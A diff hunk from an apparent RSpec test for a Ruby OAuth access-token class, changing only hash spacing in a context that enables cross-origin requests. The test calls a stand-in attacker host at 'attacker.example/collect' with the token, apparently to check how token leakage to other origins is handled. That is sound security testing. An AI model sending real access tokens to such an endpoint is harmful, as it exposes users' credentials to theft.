@@ -50,7 +50,7 @@ RSpec.describe OAuth::AccessToken do
   end
 
   context "with access_token_cross_origin_requests enabled" do
-    let(:extra_options) { { access_token_cross_origin_requests: true } }
+    let(:extra_options) { {access_token_cross_origin_requests: true} }
 
     it "allows a cross-origin absolute URI (reaches the request layer)" do
       expect { token.get("https://attacker.example/collect") }
